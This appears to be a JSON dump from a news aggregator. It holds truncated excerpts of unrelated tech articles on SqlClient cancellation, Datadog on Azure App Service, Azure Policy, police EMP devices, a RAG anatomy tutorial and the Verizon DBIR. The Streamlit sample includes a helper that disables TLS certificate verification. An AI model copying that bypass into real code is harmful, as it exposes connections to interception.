Reached:\n\nScenario: The cancellation happens before the CommandTimeout duration is met, not due to the CommandTimeout setting but possibly due to an explicit cancellation request or an unforeseen severe error during execution.\nException Thrown: General Exception (or a more specific exception depending on the context)\nInternal Error Message: \"A severe error occurred on the current command. The results, if any, should be discarded.\\r\\nOperation cancelled by user.\"\nExplanation: This exception indicates an abrupt termination of the command, potentially due to an external cancellation signal or a critical error that necessitates aborting the command. Unlike the TaskCanceledException, this may not always originate from a CancellationToken and can indicate more severe issues with the command or the connection.\n\n\n\u00a0\nusing System;\nusing System.Diagnostics;\nusing System.Data;\nusing System.Threading;\nusing System.Threading.Tasks;\nusing Microsoft.Data.SqlClient;\n\nnamespace CancellationToken\n{\n    class Program\n    {\n        private static string ConnectionString = \"Server=tcp:servername.database.windows.net,1433;User Id=username;Password=pwd!;Initial Catalog=dbname;Persist Security Info=False;MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;Pooling=true;Max Pool size=100;Min Pool Size=1;ConnectRetryCount=3;ConnectRetryInterval=10;Application Name=ConnTest\";\n        private static string Query = \"waitfor delay '00:00:20'\";\n\n        static async Task Main(string[] args)\n        {\n            SqlConnection connection = await EstablishConnectionWithRetriesAsync(3, 2000);\n            if (connection == null)\n            {\n                Console.WriteLine(\"Failed to establish a database connection.\");\n                return;\n            }\n\n            await ExecuteQueryWithRetriesAsync(connection, 5, 1000, 10000,15);\n\n            connection.Close();\n        }\n\n        private static async Task<SqlConnection> EstablishConnectionWithRetriesAsync(int maxRetries, int initialDelay)\n        {\n            SqlConnection connection = null;\n            int retryDelay = initialDelay;\n\n            for (int attempt = 1; attempt <= maxRetries; attempt++)\n            {\n                try\n                {\n                    connection = new SqlConnection(ConnectionString);\n                    await connection.OpenAsync();\n                    Console.WriteLine(\"Connection established successfully.\");\n                    return connection;\n                }\n                catch (SqlException ex)\n                {\n                    Console.WriteLine($\"Failed to establish connection: {ex.Message}.

If you've been following App Service updates, you might have caught wind of the Public Preview for the Sidecar Pattern for Linux App Service announced recently. Leveraging this development, we're here to guide you through integrating Datadog, an Azure Native ISV service partner that provides a powerful observability platform, with your .NET custom container application hosted on Linux App Service. Whether you're eager to streamline log management, track application traces, or enhance request monitoring, we've got you covered.\n \nSetting up your .NET application\nTo get started, you'll need to containerize your .NET application. This tutorial walks you through the process step by step. \n \nOnce your application is containerized, you can integrate the Datadog tracer. To do that, you will need to add the following lines to the Dockerfile for your main application.\n \n# Datadog specific\nRUN mkdir -p /datadog/tracer\nRUN mkdir -p /home/LogFiles/dotnet\n\nADD https://github.com/DataDog/dd-trace-dotnet/releases/download/v2.49.0/datadog-dotnet-apm-2.49.0.tar.gz /datadog/tracer\nRUN cd /datadog/tracer && tar -zxf datadog-dotnet-apm-2.49.0.tar.gz\n\n \nThis ensures that the Datadog tracer is properly installed and configured within your application container.\nBelow is a sample Dockerfile incorporating Datadog integration:\n \n# Stage 1: Build the application\nFROM mcr.microsoft.com/dotnet/sdk:8.0 AS build\nWORKDIR /app\n\n# Copy the project file and restore dependencies\nCOPY *.csproj ./\nRUN dotnet restore\n\n# Copy the remaining source code\nCOPY . .\n\n# Build the application\nRUN dotnet publish -c Release -o out\n\n# Stage 2: Create a runtime image\nFROM mcr.microsoft.com/dotnet/aspnet:8.0 AS runtime\nWORKDIR /app\n\n# Copy the build output from stage 1\nCOPY --from=build /app/out ./\n\n# Datadog specific\nRUN mkdir -p /datadog/tracer\nRUN mkdir -p /home/LogFiles/dotnet\n\nADD https://github.com/DataDog/dd-trace-dotnet/releases/download/v2.49.0/datadog-dotnet-apm-2.49.0.tar.gz /datadog/tracer\nRUN cd /datadog/tracer && tar -zxf datadog-dotnet-apm-2.49.0.tar.gz\n\n# Set the entry point for the application\nENTRYPOINT [\"dotnet\", \"<your dotnet app>.dll\"]\n \nYou're now ready to build the image and push it to your preferred container registry, be it Azure Container Registry, Docker Hub, or a private registry.\n \nCreate your Linux Web App\nCreate a new Linux Web App from the portal and choose the options for Container and Linux.\n \n \n\n \nOn the Container tab, make sure that Sidecar support is Enabled.\n \nSpecify the details of your application image.\n \n\n \nNote: Typically, .NET uses port 8080 but you can change it in your project.\n \nSetup your Datadog\nIf you don\u2019t have a Datadog account, you can create an instance of Datadog on the Azure portal by following this QuickStart.\nCreate Datadog - Azure Native ISV Services | Microsoft Learn\n\u00a0\nAlternatively, you can also create a service account on Datadog by following the steps in this tutorial.\nService Accounts (datadoghq.com)\n\u00a0\nDatadog offers a 14 days Free Trial if you would like to try out the service.\n\u00a0\nAppSettings for the Datadog Integration\nYou need to set the following AppSettings.\n\nDD_API_KEY \u2013 If you have created the Datadog resource on the Azure portal, you can manage your API keys like this.\n\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0Alternatively, you can create your API Key by following the steps here\u00a0API and Application Keys (datadoghq.com).\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0We would encourage you to add sensitive information like API keys to Azure Key vault Use Key Vault references - Azure App Service | Microsoft Learn.\n\nDD_SITE \u2013 Datadog offers you different sites for your data. You can use us3.datadoghq.com as this site is hosted in Azure. Therefore, the Observability data for your application stays in Azure. You can find more information about Datadog sites here.\n\n\nDD_SERVICE: The name of the service that would be displayed in your Datadog Service Catalog.\nDD_ENV: This is used to set the global environment, which allows you to differentiate data coming from various environments like staging or production.\nDD_SERVERLESS_LOG_PATH: This is the path where you write your application logs. Typically, this will be /home/Logfile/*.log, If you have changed the location for your application logs, you can specify that in this setting.\nDD_DOTNET_TRACER_HOME: /datadog/tracer\nDD_TRACE_LOG_DIRECTORY: /home/Logfiles/dotnet\nCORECLR_ENABLE_PROFILING: 1\nCORECLR_PROFILER: {846F5F1C-F9AE-4B07-969E-05C26BC060D8}\nCORECLR_PROFILER_PATH: /datadog/tracer/Datadog.Trace.ClrProfiler.Native.so\n\nTo know more about these Datadog settings, you can refer to the documentation.\n\u00a0\nAdd the Datadog Sidecar\nGo to the Deployment Center for your application and add a sidecar container\n\n\u00a0\n\u00a0\nImage Source: Docker Hub and other registries\nImage type: Public\nRegistry server URL: svlsddagent.azurecr.io    \nImage and tag: serverless-sidecar:latest\nPort: 8126\n\n\u00a0\nDisclaimer: Datadog Image Usage\nIt's important to note that the Datadog image used here is sourced directly from Datadog and is provided 'as-is.' Microsoft does not own or maintain this image.

We can add multiple custom policies for any Azure Product which can be modified and changed at any point of time.\n \nIn summary, Azure custom policies provide a powerful and flexible framework to design tailored identity experiences, integrate with external systems, and meet advanced security and compliance requirements. \n \nReference link on how to develop custom policies can be found here- Tutorial: Create a custom policy definition - Azure Policy | Microsoft Learn\n \nCommon Issues which can be seen while developing Custom Policy \nIssue #1: An incorrect or nonexistent alias is used in a policy definition. \nWhile Adding Policy Definition, always make sure that Correct Policy Alias is used otherwise you will get the error stating that \" incorrect alias/alias not available\". There are multiple ways to check the policy Alias which is described as below\n \n\n\nUse Powershell Command Get-AzPolicyAlias For example, if you are developing Policy for Resource type - Microsoft.Storage , then we will use below command:(Get-AzPolicyAlias -NamespaceMatch 'storage').Aliases\u200bOnce you run the above PowerShell command, you will get full list of available aliases which can be used to develop policies.Reference Link: Get-AzPolicyAlias (Az.Resources) | Microsoft Learn \nDeploy Resource, Add configuration which you are expecting in your custom Policy and Check GET/PUT calls to understand which property/alias is getting passed in backend via developer tools while adding configuration. For example, if you want to enable Entra ID authentication in Web apps and check via custom policy that resource has entra ID auth enabled, then you will deploy web app and enable entra id authentication and check the values getting passed in backend while enabling entra id. Below Screenshots will help you understand how to check the values. We are adding authentication for app service here:   \u00a0Now, before clicking on add button, open developer tools:\u00a0\u00a0\u00a0\u00a0Come back and Add the Authentication for web apps:\u00a0\u00a0\u00a0Now Go back to developer tools and check the Get/PUT calls after stopping recording:\u00a0\u00a0Click on batchapiversion and under \"response\" check values which are updated while you have added authentication for your app service. You will see the appropriate alias value and multiple properties inside it, which will help you understand correct values which are needed to be added in custom policy to check if Entra ID is enabled for resource or not.\u00a0\u00a0\u00a0\nYou can also use Azure Policy Extension for Visual Studio Code to check the correct Policy Alias for your custom policy\n\n\n\u00a0\nIssue #2: No Resources Found under Compliance Report.\u00a0\nThere can be a possibility that once you add your custom policy, your resources are not visible under compliance report. To fix this issue, please make sure that you have provided correct resource type inside your policy definition and Read operation is available for the resource type. For example - resource type - > Microsoft.DBforPostgreSQL/flexibleServers, if read operation-\u00a0\nMicrosoft.DBforPostgreSQL/flexibleServers/read is not avaialble, then you wont be able to see resources under compliance report. Please make a note that if read operation is not available, raise a request to PG team to add the read feature for that product.\n\u00a0\nAll operation available for a particular product can be checked using this link-\u00a0Azure permissions - Azure RBAC | Microsoft Learn\n\u00a0\u00a0\nIssue #3: Incorrect Compliance Report\u00a0\u00a0\nThere can be a case where custom policy is added however compliance report is not correct. For eg- Your Resource is marked as compliant however it is non-compliant and vice versa. To solve this issue, we have to make sure that our policy rule is correct. Try to reverse the policy rule, use different combinations of \"if\", \"then\" block with \"All\", \"Any\" Conditions and test your policy to see if compliance report is changing.\n\u00a0\nReference for Policy Rule can be found here-\u00a0Details of the policy definition structure policy rules - Azure Policy | Microsoft Learn\n\u00a0\nAlso make sure that Policy Effect is working properly. If policy effect is not working as expected, this can also impact the compliance report. To solve this, we have to check the PUT and GET requests for particular product and see if it is working with the effect. Sometimes \"Deny\" effect does not support the resource type for a particular policy rule and changing the effect to \"Audit\" will support the policy rule and gives the correct compliance report.\n\u00a0\nIssue #4: Unable to Develop Custom Policy- Alias Not Available\u00a0\nThere can be a case that Policy Alias is not available to add the custom policy. In this case, we have to report it directly to PG team to check if Alias can be added in future as a new feature release or not.\n\u00a0\nPlease make a note that there can be cases where due to security reasons, particular alias cannot be added by PG team . In those cases, we have to check alternative options or values which can be consumed indirectly to implement custom policy.\n\u00a0\nIssue #5: Incorrect Mode Usage\n\u00a0\nIt is very important to understand that Value \"Mode\" in policy definition structure is referenced correctly otherwise the resource compliant will be incorrect.\n\u00a0\nAs a best practice, always use Mode as \"All\" in your policy definitions. If Mode as \"Indexed\" is used it will\u00a0limit evaluation to only those resources that support tags and you wont be able to see correct compliance report for other resources.\n\u00a0\n", "hash": "f120b73b332e492c2913fd46b506501821c7fc91f80f9f29b12008535d3095c1", "id": "5f0e2b4a-85f5-4ee8-9476-05d3ab1c8272", "link": "https://techcommunity.microsoft.com/t5/microsoft-developer-community/troubleshooting-common-custom-policy-issues-in-policy/ba-p/4140787", "osint_source_id": "0c4fb663-1b11-4849-bc50-10a20eb1496b", "published": "2024-05-16T00:04:00", "source": "https://techcommunity.microsoft.com/plugins/custom/microsoft/o365/custom-blog-rss?tid=-1562856755638734148&amp;board=Exchange&amp;label=Security&amp;messages=&amp;size=30", "story_id": "f0023b82-ea3b-4ab1-97a3-cca108e15147", "title": "Troubleshooting Common Custom Policy Issues in Policy Development"}], "tags": {"Alias": {"name": "Alias", "tag_type": "PER"}, "Azure Custom Policies": {"name": "Azure Custom Policies", "tag_type": "MISC"}, "Azure Policy": {"name": "Azure Policy", "tag_type": "MISC"}, "Entra": {"name": "Entra", "tag_type": "ORG"}, "Policy Rule": {"name": "Policy Rule", "tag_type": "MISC"}}, "title": "Troubleshooting Common Custom Policy Issues in Policy Development"}, {"attributes": [{"created": "2024-05-16T01:19:48.296236", "id": "2df807de-4697-4f0d-9af5-fa3cef408ac7", "key": "NLP_BOT", "value": "12"}], "created": "2024-05-16T00:01:00", "id": "f9a845af-ec18-451b-af72-64dabb497c6e", "news_items": [{"author": "msmash", "content": "UK Police Could Get Ghostbusters-style Backpack Devices To Halt Ebike Getaways (theguardian.com) 10\nPolice officers in Britain could be armed with Ghostbusters-style devices that fire electromagnetic rays to shut down the engines of ebikes being used in a crime. From a report: Gavin Stephens, chair of the National Police Chiefs' Council (NPCC), said the weapon was in development and could be months away from being available, though it is expected to be longer than that. He said it would be housed in a backpack, reminiscent of the equipment used in the Ghostbusters series of movies. It could tackle crime linked to newer vehicles such as electric bikes and electric scooters.\nThe device is being developed with the Defence Science and Technology Lab, which is overseen by the Ministry of Defence, alongside other technological innovations that British police are hoping to use. It would fire an electromagnetic pulse at a vehicle that an officer wants to stop because the rider is suspected of involvement in a crime. The electromagnetic weapon works by tricking the engine into thinking it is overheating, which shuts down the engine and brings the vehicle to a stop. It requires a line of sight to work, Stephens said.\nStephens told a media briefing: \"Basically, it interferes with the electric motor, to trick the electric motor into thinking it is overheating. It sends a signal to confuse the electric motor. All these electric motors apparently have an inbuilt safety system that if it thinks it's overheating, it shuts down. At the minute, it's like a ginormous backpack.\" The equipment was demonstrated to police leaders at the Farnborough technology show earlier this year.

They may not have up-to-date information due to their knowledge cutoff date for training. This poses a significant challenge when we want our AI models to provide accurate, context-aware, and timely responses. Imagine asking an LLM about the latest technology trends or seeking real-time updates on a breaking news event; traditional language models might fall short in these scenarios.\n \nIn this blog, we will introduce you to a game-changing technique called retrieval-augmented generation (RAG). This unique approach empowers language models such as GPT to bridge the gap between their static knowledge and the dynamic real world. With RAG, we\u2019ll show you how to equip your generative AI applications with the ability to pull in fresh information, ground your organizational data, cross-reference facts to address hallucinations and stay contextually aware, all in real-time.\n \nGenerative AI technology has the potential to greatly enhance education in the health sector, particularly in fields like anatomy and physiology. This is because AI platforms can create highly detailed and interactive models of the human body, making complex systems like the cardiovascular or nervous systems easier to understand than with traditional methods.\n \nAnother benefit of generative AI is its ability to personalize the learning experience. By analyzing a student's performance, the AI can identify areas where the student needs improvement and generate customized practice questions to target those areas. Additionally, generative AI can simulate patient interactions, which is essential in enhancing diagnostic skills.\n \nThis blog will show how generative AI using Azure AI studio prompt flow with Multi-Round Q&A on Your Data chat can make anatomy and physiology education more interactive, engaging, and effective and help students prepare for their healthcare careers.\n \n1.

Use the index in your prompt flow\n\u00a0\nIn this example, I\u2019ll use a ready-made template from the Prompt Flow page. I\u2019ll choose the \u201cMulti-Round Q&A on Your Data\u201d template, which applies an augmented generation method to the retrieved Essentials of Anatomy and Philosophy book, based on a user\u2019s question.\n\u00a0\n\nYou can easily clone this Flow and start exploring it.\n\u00a0\n\n\u00a0\nLet us analyze the individual parts that comprise it and delve into their unique characteristics:\n\nInputs: User\u2019s query and Chat history: contains the history chat\nOutput : Model\u2019s augmented response\n\n\u00a0\n\n\u00a0\n\nmodify_query_with_history\n\nBefore the question gets embedded, modify_query_with_history adds context to the question by including instructions and the chat history. This is the default prompt:\n\u00a0\n\n\u00a0\n\nExamples of chat history:\n\nInput: Hi, I'm struggling to understand how the nervous system interacts with other body systems. Can you help?\nOutput: Absolutely! The nervous system interacts with other body systems primarily through nerve impulses that control and coordinate actions. For example, the nervous system sends signals to the muscular system to initiate movement.\n\u00a0\nInput: That makes sense. Can you explain how the nervous system affects the digestive system?\nOutput: Sure! The nervous system regulates the speed at which food is digested through signals that increase or decrease the rate of muscle contractions in the gastrointestinal tract. This is crucial for efficient digestion and nutrient absorption.\n\u00a0\nInput: Thanks! How about the cardiovascular system? How does the nervous system interact with that?\nOutput: The nervous system controls the heart rate and blood pressure. It can send signals to the heart to speed up or slow down based on the body's needs, like during exercise or rest.\n\u00a0\n\nlookup\n\nWe use lookup \u00a0to link our data to the model. The data must be indexed first, which is done in the Azure AI Studio \u2018Indexes\u2019 component on the side bar.\nIn the\u00a0lookup\u00a0section,\u00a0 set the following parameter values:\n\nmlindex_content:\u00a0Select the empty field to open the Generate pane\n\nindex_type: Registered Index\nmlindex_asset_id: brochures-index:1\n\nqueries:\u00a0${modify_query_with_history.output}\nquery_type:\u00a0Hybrid (vector + keyword)\ntop_k: 2\n\n\n\u00a0\nTo get the right path, go to Build / your_project_name / Data / your_index_name, click on Index Data and copy the Data connection URI from the Data links section\n\n\u00a0\n\ngenerate_prompt_context\u00a0\n\ngenerate_prompt_context receives a list of search result entities as input and turns them into a string with content and source information for each document. This function enhances the intelligence level by adding pertinent details to the prompt, enabling more knowledgeable and context-sensitive responses.\n\u00a0\n\n\u00a0\n\nPrompt_variants\n\nWith prompt_variants, you can make different versions of prompts to get more variety in the questions you ask.\n\u00a0\n\n\u00a0\n\nchat_with_context \n\nchat_with_context \u00a0uses the context created by generate_prompt_context to improve the conversation. It takes into account the previous context and the related document chunks, which helps it to reply more logically and correctly.\n\u00a0\n\n\u00a0\nLet's test the chat to see how it reacts.\n\u00a0\n\n\u00a0\nAfter creating the flow, we can deploy it as a managed endpoint, which can be consumed through REST API by clicking the \"Deploy\" button on the flow page.\n\u00a0\n\n\u00a0\n\u00a0\nAfter that, you will need to choose a virtual machine that will be used to facilitate the deployment process :\n\u00a0\n\n\u00a0\nNote that there is a feature available that you can opt to enable, called Inferencing data collection (currently in preview). When enabled, it automatically collects inputs and outputs as a data asset within your Azure AI Studio. This can be used later as a test dataset.\n9. Consuming your Prompt Flow\n\u00a0\nAfter deploying your flow in Azure AI Studio, you can consume it as a managed endpoint. To access this feature, simply navigate to the \"Deployments\" tab and click on your flow's name. From there, you can also test your flow to ensure it's working properly before consumption.\n\u00a0\n\nWe can use streamlit in VS Code to write the code that will view your Endpoint and Keys. Go to the consume tab and copy and paste\u00a0them into your code.\n\u00a0\n\u00a0\nimport streamlit as st\nimport urllib.request\nimport json\nimport os\nimport ssl\nfrom dotenv import load_dotenv\n\n# Load environment variables\nload_dotenv()\nAZURE_ENDPOINT_KEY = os.environ['AZURE_ENDPOINT_KEY'] = 'xxxxxxxxxxxxxxxxxxxxxx'\n\ndef allowSelfSignedHttps(allowed):\n    # Bypass the server certificate verification on the client side\n    if allowed and not os.environ.get('PYTHONHTTPSVERIFY', '') and getattr(ssl, '_create_unverified_context', None):\n        ssl._create_default_https_context = ssl._create_unverified_context\n# Streamlit UI components\n    st.image(\"education.png\", width=600)\n    st.title(' Welcome to your Essential of Anantomy and Physiology Assistant!')\n    st.sidebar.title(\" Copilot for Anantomy and Physiology  !\")\n    st.sidebar.caption(\"Made by an Pascal Burume\")\n    st.sidebar.info(\"\"\"\n    Generative AI technology has the potential to greatly enhance education in the health sector, particularly in fields like anatomy and physiology.

Conclusion\nAs we wrap up this exploration into the transformative capabilities of generative AI technologies, particularly within the realms of education and healthcare, it's clear that the potential for innovation is immense. By leveraging retrieval-augmented generation (RAG), we have unlocked a path that bridges the gap between static data and the dynamic needs of real-world applications. This blog has outlined not just the theoretical possibilities but also practical steps to implement these technologies using Azure AI Studio.\n\u00a0\nThank you for joining us on this insightful journey through the capabilities of modern AI technologies. We are excited about the future possibilities as we continue to push the boundaries of what AI can achieve in educational contexts. Let\u2019s move forward into a future where technology and education merge to create enriching, empowering learning experiences.\n\u00a0\n10.

With that said, let\u00e2s dive in and see what the 2024 report has to offer us.\u00c2 As always, I will be looking at this report from the human risk perspective.\nSummary of Key Findings\nThis year\u00e2s report is based on 30,458 real-world security incidents, of which 10,626 were confirmed data breaches (a record high for breaches).\u00c2 VZ DBIR defines a breach as a type of incident where data has been compromised, which are often the most damaging type of breaches, as media, lawyers, and regulators get involved. Here are a couple of my key take-aways from the Executive Summary.\nHuman Element: Just as in years past, people represent the greatest risk to an organization, with humans involved in 68% of all breaches. You may notice that this is a slight drop from last year, however there is a good reason for this.\u00c2 The VZ DBIR team no longer includes malicious insiders (what they call Privileged Misuse) in the statistic. There are good reasons for this, seeing as how you handle malicious insiders is vastly different than how you secure employees who are targeted (phishing attacks) or employees who simply made a mistake.\n-\nHuman Error: People making mistakes has increased in driving breaches, now 28%. Human Errors are mistakes such as people emailing the wrong person with sensitive data due to auto-complete in email or IT Admins accidentally sharing sensitive data in the cloud. The large increase may be in part because technology continues to get more and more complicated and people are working faster than ever, creating the perfect environment for mistakes to happen.\u00c2 To approach this, our job is to make technology, process and security as simple as possible.\u00c2 The simpler a behavior is, not only the more likely people will exhibit that behavior, but more likely they will do it correctly.\u00c2\n-\nTop Attack Drivers\nIn Figure 1 below, we see the top three ways cyber threat actors are getting into organizations: credentials, phishing, and vulnerability exploiting.\u00c2 These are the same top findings from the past three years. I was intrigued to see that phishing seemed to be much lower percentage-wise compared to credential/account takeover. The VZ DBIR team explained that a huge percentage of credential stealing happens with phishing, but the VZ DBIR team often cannot prove how cyber threat actors got the credentials in the first place.\u00c2 Long story short, just as in the past three years, if you are focusing on human security, continue to focus on:\nStrong Authentication: long, unique passwords and MFA\n-\nPhishing: I would throw vishing/ smishing in there also\n-\nPatched Systems: enable automatic updating for individuals\n-\nBusiness Email Compromise (BEC)\nPhishing continues to be one of the biggest categories of phishing attacks, but what I found interesting in this year\u00e2s data set is that over 40% of successful social engineering attacks were Business Email Compromise (BEC)/CEO Fraud imposter attacks, or what VZ DBIR calls \"pretexting\" (see Figure 34 in the report).\u00c2 These are email attacks that have no malicious link or infected email attachment. Instead, these attacks are most often financially motivated, tricking people into approving invoices, payments or change of bank account information. The goal is purely to steal money.\u00c2 The reason I emphasize this is we often hear of ransomware in the news, as organizations have to go public when a ransomware incident happens. However, we almost never hear about BEC/CEO Fraud incidents in the news, as organizations do not have to, nor almost never do, go public. You have to go public when your data is breached; you do not have to go public when your money is stolen.\nBEC/CEO Fraud emails are often the most difficult for automated security tools or people to detect, as these emails are often highly customized and have far fewer indicators in the email. In addition, Artificial Intelligence has the ability to make creating these customized attacks easier, and in almost any language the cyber attacker wants.\u00c2 This is why it's so critical that employees strictly adhere to and follow all policies related to the approving, invoicing, transferring of money, or modifying related financial accounts.\nLost/Stolen Devices\nOne data point I always find interesting is the tracking of lost and stolen devices.\u00c2 While we often don\u00e2t think of this as a risk, when we lose control of a mobile device, the data on that device is at risk.\u00c2 This is why controls such as screen-locks, encryption, and remote tracking/wiping are so important.\u00c2 You are far more likely to lose a mobile device or have one stolen than you are to have it be hacked (it\u00e2s actually quite difficult to hack an actively patched and maintained mobile device). In Figure 54 of the report, we see a fascinating statistic: You are far more likely to lose a device than have one stolen. So, when it comes to physical security, it is not the thief we should be concerned about, but the absent-minded, overwhelmed employee who is traveling.\nWant to Learn More? - Artificial Intelligence\nThese are by no means the only findings in the report; these are just the ones I found most interesting.\nStill have questions or want other details, but don\u00e2t have time to read the full report? Want to learn all the key take-aways from the report specific to your role, industry, or challenges you face? Ask AI to help summarize key elements of the report for you. See example below.\nTo learn more about building a mature security awareness program, consider the SANS LDR433 Managing Human Risk course.\u00c2 This intense, three-day class provides you the strategic roadmap to not only managing human risk but also to effectively measure it. In addition, the class provides seven interactive team labs where you apply everything you learn with your peers.\u00c2 Finally, you have the opportunity to earn the SSAP (SANS Security Awareness Professional), the industry\u00e2s most recognized credential demonstrating expertise in managing human risk.", "hash": "77c7d1f3b4051d3ee5a6ec7c2997f86e96df8bf1e1877eb7975852ca5cc6f6da", "id": "5acbafa3-9d77-4459-b341-1ad77622642b", "link": "https://www.sans.org/blog/tackling-modern-human-risks-in-cybersecurity-insights-from-the-verizon-dbir-2024?msc=rss", "osint_source_id": "b9508947-66d4-4215-bfd8-4c684a0e5acf", "published": "2024-05-16T00:00:00", "source": "https://ics.sans.org/blog/feed/", "story_id": "b98c0cb5-b5fd-4e7c-84d7-d8ff49c1aa7a", "title": "Tackling Modern Human Risks in Cybersecurity: Insights from the Verizon DBIR 2024"}], "tags": {"Business Email Compromise": {"name": "Business Email Compromise", "tag_type": "MISC"}, "Data breach": {"name": "Data breach", "tag_type": "Cybersecurity"}, "MFA": {"name": "MFA", "tag_type": "MISC"}, "Verizon": {"name": "Verizon", "tag_type": "ORG"}, "Verizon Data Breach Incident Report": {"name": "Verizon Data Breach Incident Report", "tag_type": "ORG"}, "phishing": {"name": "phishing", "tag_type": "Cybersecurity"}, "ransomware": {"name": "ransomware", "tag_type": "Cybersecurity"}}, "title": "Tackling Modern Human Risks in Cybersecurity: Insights from the Verizon DBIR 2024"}]
